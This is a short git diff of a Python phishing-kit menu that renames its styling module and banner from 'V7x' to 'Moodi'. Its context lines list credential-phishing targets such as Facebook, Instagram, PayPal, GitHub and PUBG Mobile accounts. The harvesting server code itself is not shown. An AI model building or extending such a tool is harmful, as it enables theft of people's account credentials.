@@ -2,8 +2,8 @@
 #########################7x
 import time, os, threading
 from tools.Fishing.server import Fishing, db_File
-from V7xStyle import Animation as A , G ,Text
-from V7xStyle import Style
+from MoodiStyle import Animation as A , G ,Text
+from MoodiStyle import Style
 #########################7x
 class App:
     @property
@@ -18,7 +18,7 @@ class App:
         print ("\033[1;31m| )      ___) (___/\\____) || )   ( |___) (___| )  \\  || (___) |")
         print ("\033[1;31m|/       \\_______/\\_______)|/     \\|\\_______/|/    )_)(_______)")
         print (" ")
-        print ("\033[1;32m  V7x Fishing Tool  \033[1;36m  * _ *  \033[1;32m  Version: \033[1;31m2   \033[1;32m Date: \033[1;31m10-3-2020            ")
+        print ("\033[1;32m  Moodi Fishing Tool  \033[1;36m  * _ *  \033[1;32m  Version: \033[1;31m2   \033[1;32m Date: \033[1;31m10-3-2020            ")
         print ("        ")
         SA = ['R#[G#1R#] C#FaceBook Accounts','R#[G#2R#] C#Instagram Accounts','R#[G#3R#] C#Paypal Accounts','R#[G#4R#] C#Github Accounts','R#[G#5R#] C#Yahoo Accounts','R#[G#6R#] C#Clash Of Clans Accounts','R#[G#7R#] C#PUBG Mobile Accounts','C#Available SoOoN..!'] 
         S = Style(*SA).Square(cols=2,padding_x=1,padding_y=1)
